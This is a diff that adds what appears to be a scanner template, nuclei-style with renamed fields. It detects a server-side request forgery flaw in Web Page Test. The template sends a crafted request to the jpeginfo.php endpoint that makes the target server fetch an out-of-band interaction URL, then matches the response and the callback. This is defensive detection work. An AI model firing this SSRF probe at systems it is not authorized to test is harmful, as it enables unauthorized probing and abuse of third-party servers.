@@ -1,0 +1,26 @@
+id: webpagetest-ssrf
+brief:
+    title: Web Page Test - Server Side Request Forgery (SSRF)
+    by: pdteam
+    level: high
+    about: Web Page Test is vulnerable to SSRF.
+    label:
+        - ssrf
+        - webpagetest
+        - oast
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/jpeginfo/jpeginfo.php?url={{interactsh-url}}'
+      signs:
+        - "on": word
+          has:
+            - File is not a JPEG Image
+          in: body
+          need: all
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
+          need: all
